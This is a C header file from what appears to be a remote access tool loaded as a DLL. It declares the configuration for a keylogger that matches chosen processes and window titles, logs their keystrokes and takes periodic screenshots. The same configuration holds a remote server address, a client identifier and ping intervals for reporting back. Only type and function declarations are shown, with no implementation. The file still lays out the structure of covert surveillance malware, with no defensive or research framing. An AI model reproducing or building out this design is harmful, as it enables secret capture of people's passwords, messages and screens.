/**
 * remote_config.h
 * Loads server address and port from config.json (same directory as DLL or process).
 * No external dependencies; minimal JSON-style parsing for "ServerAddress" and "ServerPort".
 */
#ifndef REMOTE_CONFIG_H
#define REMOTE_CONFIG_H

#ifdef __cplusplus
extern "C" {
#endif

/* Keylogger target matching limits (keep them small to avoid heavy config parsing). */
#define KEYLOGGER_MAX_TARGETS 8
#define KEYLOGGER_MAX_PATTERNS 16
#define KEYLOGGER_MAX_PATTERN_LEN 128

typedef struct keylogger_target {
    /* If process_pattern_count == 0, this target is ignored completely. */
    char process_patterns[KEYLOGGER_MAX_PATTERNS][KEYLOGGER_MAX_PATTERN_LEN];
    int process_pattern_count;

    /* If title_pattern_count == 0, match all window titles for matching processes. */
    char title_patterns[KEYLOGGER_MAX_PATTERNS][KEYLOGGER_MAX_PATTERN_LEN];
    int title_pattern_count;

    int keyboard;                /* 1: actually log keystrokes */
    int save_screenshots;       /* 1: capture screenshots */
    int screenshot_interval_sec; /* interval while target match is active */
} keylogger_target_t;

typedef struct remote_config {
    char server_address[256];
    unsigned short server_port;
    char uuid[65]; /* 64-char identifier sent as ClientIdentification.Id (protobuf field 7). */
    int ghost_transparency;  /* 0..100, percent transparent (90=very transparent). Default 90. */
    int keylogging;         /* 0=disabled (no logs), 1=enabled (log keystrokes). Default 0. */
    int ping_interval_minutes; /* Ping interval in minutes for periodic ClientPingRequest. Default 0=disabled. */

    keylogger_target_t targets[KEYLOGGER_MAX_TARGETS];
    int target_count; /* number of valid target objects (0 = disabled) */
    int valid;
} remote_config_t;

/* Load config from config.json. Returns 1 on success, 0 on failure. */
int remote_config_load(remote_config_t* out_config);

#ifdef __cplusplus
}
#endif

#endif /* REMOTE_CONFIG_H */
